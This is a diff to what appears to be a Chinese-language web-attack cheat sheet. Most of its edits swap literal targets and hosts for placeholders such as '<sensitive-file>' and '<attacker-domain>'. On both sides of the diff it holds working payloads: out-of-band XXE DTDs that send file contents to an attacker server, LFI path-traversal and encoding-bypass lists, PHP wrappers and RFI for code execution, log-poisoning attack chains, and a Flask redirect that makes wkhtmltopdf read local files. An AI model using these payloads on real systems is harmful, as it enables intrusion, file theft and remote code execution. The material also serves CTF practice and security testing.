@@ -77,7 +77,7 @@ with open("zip_slip.zip", "wb") as f:
 ```xml
 <!-- Probe 1: 文件读取 -->
 <?xml version="1.0"?>
-<!DOCTYPE x [<!ENTITY file SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE x [<!ENTITY file SYSTEM "file://<sensitive-file>">]>
 <root><data>&file;</data></root>
 
 <!-- Probe 2: 内网 SSRF -->
@@ -88,20 +88,20 @@ with open("zip_slip.zip", "wb") as f:
 <!-- Probe 3: Blind XXE (out-of-band) -->
 <?xml version="1.0"?>
 <!DOCTYPE x [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval SYSTEM "http://attacker.com/evil.dtd">
+  <!ENTITY % file SYSTEM "file://<sensitive-file>">
+  <!ENTITY % eval SYSTEM "http://<attacker-domain>/evil.dtd">
   %eval;
 ]>
 <root><data>test</data></root>
 
-<!-- evil.dtd (托管在 attacker.com) -->
-<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">
+<!-- evil.dtd (托管在 <attacker-domain>) -->
+<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://<attacker-domain>/?%file;'>">
 %all;
 
 <!-- Probe 4: 通过参数实体 -->
 <?xml version="1.0"?>
 <!DOCTYPE x [
-  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  <!ENTITY % dtd SYSTEM "http://<attacker-domain>/evil.dtd">
   %dtd;
 ]>
 <root><data>&exfil;</data></root>
@@ -121,7 +121,7 @@ with open("zip_slip.zip", "wb") as f:
 # 不同协议和编码的 Payload
 XXE_PAYLOADS = [
     # 基础文件读取
-    'file:///etc/passwd',
+    'file://<sensitive-file>',
     'file:///c:/windows/win.ini',
     # PHP wrapper
     'php://filter/convert.base64-encode/resource=/var/www/html/config.php',
@@ -129,11 +129,11 @@ XXE_PAYLOADS = [
     # jar (Java)
     'jar:file:///var/www/webapp.war!/WEB-INF/web.xml',
     # netdoc (Java)
-    'netdoc:///etc/passwd',
+    'netdoc://<sensitive-file>',
     # expect (RCE if enabled)
     'expect://id',
     # LDAP
-    'ldap://attacker.com/evil',
+    'ldap://<attacker-domain>/evil',
 ]
 ```
 
@@ -145,21 +145,21 @@ import requests, urllib.parse
 
 LFI_PAYLOADS = [
     # 直接路径穿越
-    "../../../../../../etc/passwd",
-    "....//....//....//....//etc/passwd",   # 过滤 ../ 的绕过
-    "..././..././..././..././etc/passwd",  # 另一种绕过
+    "../../../../../..<sensitive-file>",
+    "....//....//....//..../<sensitive-file>",   # 过滤 ../ 的绕过
+    "..././..././..././.../.<sensitive-file>",  # 另一种绕过
     # Null byte (PHP < 5.3)
-    "../../../../../../etc/passwd%00",
-    "../../../../../../etc/passwd%00.jpg",
+    "../../../../../..<sensitive-file>%00",
+    "../../../../../..<sensitive-file>%00.jpg",
     # 编码绕过
     "..%2f..%2f..%2f..%2fetc%2fpasswd",   # URL 编码
     "..%252f..%252f..%252f..%252fetc%252fpasswd", # 双编码
     # 绝对路径
-    "/etc/passwd",
+    "<sensitive-file>",
     "C:\\Windows\\win.ini",
     # PHP wrapper
     "php://filter/convert.base64-encode/resource=index",
-    "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
+    "php://filter/read=convert.base64-encode/resource=../../..<sensitive-file>",
     "php://input",                        # POST body 当 PHP code
     "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
     "expect://id",
@@ -261,12 +261,12 @@ PHP_WRAPPERS = [
 
 ```php
 # 需要 allow_url_include=On (PHP < 7.4)
-# → include('http://attacker.com/shell.txt')
+# → include('http://<attacker-domain>/shell.txt')
 # → shell.txt 中的 PHP 代码被执行
 
 # 探测:
-# ?file=http://attacker.com/test.txt
-# 若 attacker.com 收到请求 → RFI 可行
+# ?file=http://<attacker-domain>/test.txt
+# 若 <attacker-domain> 收到请求 → RFI 可行
 ```
 
 ## 6. Node.js Path Traversal Poison
@@ -274,21 +274,21 @@ PHP_WRAPPERS = [
 ```python
 # Node.js 路径穿越特有手法
 # 1. 编码绕过
-"/../../../../../../etc/passwd"
+"/../../../../../..<sensitive-file>"
 "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
-"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-"/..;/..;/..;/..;/..;/etc/passwd"          # Spring/Tomcat
+"/%2e%2e/%2e%2e/%2e%2e/%2e%2e<sensitive-file>"
+"/..;/..;/..;/..;/..;<sensitive-file>"          # Spring/Tomcat
 
 # 2. Unicode 绕过
 "/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
 "/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"  # 全角斜线
 
 # 3. 符号链接绕过
-"/proc/self/root/../../etc/passwd"
+"/proc/self/root/../..<sensitive-file>"
 
 # 4. 路径截断
-"../../../../../../etc/passwd%00"
-"../../../../../../etc/passwd%00.jpg"
+"../../../../../..<sensitive-file>%00"
+"../../../../../..<sensitive-file>%00.jpg"
 ```
 
 ## 7. XXE OOB 完整版
@@ -296,15 +296,15 @@ PHP_WRAPPERS = [
 ```xml
 <!-- Blind XXE — 外带数据到攻击者服务器 -->
 
-<!-- evil.dtd (托管在 attacker.com) -->
+<!-- evil.dtd (托管在 <attacker-domain>) -->
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<attacker-domain>/?%file;'>">
 %eval;
 
 <!-- 发送的 payload -->
 <?xml version="1.0"?>
 <!DOCTYPE x [
-  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  <!ENTITY % dtd SYSTEM "http://<attacker-domain>/evil.dtd">
   %dtd;
 ]>
 <root>&exfil;</root>
@@ -315,13 +315,13 @@ PHP_WRAPPERS = [
 ```
 文件上传 → 双扩展名绕过 → webshell → RCE → flag
 文件上传 → Zip Slip → 覆盖 authorized_keys → SSH 登录
-文件上传 → SVG XXE → 文件读取 → /etc/passwd + shadow
+文件上传 → SVG XXE → 文件读取 → <sensitive-file> + shadow
 XXE Out-of-Band → 文件外带 → /flag → base64 DNS 分段传出
 LFI → /proc/self/environ → 环境变量泄露 → API key/DB 密码
 LFI → php://input → POST body 执行 → RCE
 LFI → Session Upload Progress → 竞态包含 → PHP 代码执行
 LFI → 日志污染 → User-Agent <?php ?> → access.log 包含 → RCE
-RFI → 远程包含 → attacker.com/shell.txt → RCE
+RFI → 远程包含 → <attacker-domain>/shell.txt → RCE
 XXE → SSRF → 内网探测 → 内部 Admin Panel
 文件上传 → .htaccess → AddType 覆盖 → 任意扩展名被执行
 LFI → proc/self/fd → 文件句柄泄露 → 读取临时上传文件
@@ -350,17 +350,17 @@ done < lfi_wordlist.txt
 
 ```python
 # wkhtmltopdf 跟随 HTTP redirect
-# → 攻击者的 web server 返回 302 → file:///etc/passwd
-# → PDF 包含 /etc/passwd 内容
+# → 攻击者的 web server 返回 302 → file://<sensitive-file>
+# → PDF 包含 <sensitive-file> 内容
 from flask import Flask, redirect
 app = Flask(__name__)
 
 @app.route('/malicious.html')
 def redirect_to_file():
-    return redirect('file:///etc/passwd', code=302)
+    return redirect('file://<sensitive-file>', code=302)
 
-# 目标: /generate-pdf?url=https://attacker.com/malicious.html
-# PDF 输出 → 下载 → 看到 /etc/passwd
+# 目标: /generate-pdf?url=https://<attacker-domain>/malicious.html
+# PDF 输出 → 下载 → 看到 <sensitive-file>
 ```
 
 ### wkhtmltopdf XSS → file:// EXFIL
@@ -382,7 +382,7 @@ document.body.innerText = xhr.responseText;
 ```javascript
 // 如果 puppeteer 运行在沙箱内 → 读 /etc/hostname 等
 // 如果 --no-sandbox → 完整 RCE 可能
-await page.goto('file:///etc/passwd');
+await page.goto('file://<sensitive-file>');
 await page.pdf({path: 'output.pdf'});
 // output.pdf 中包含 passwd 内容
 ```
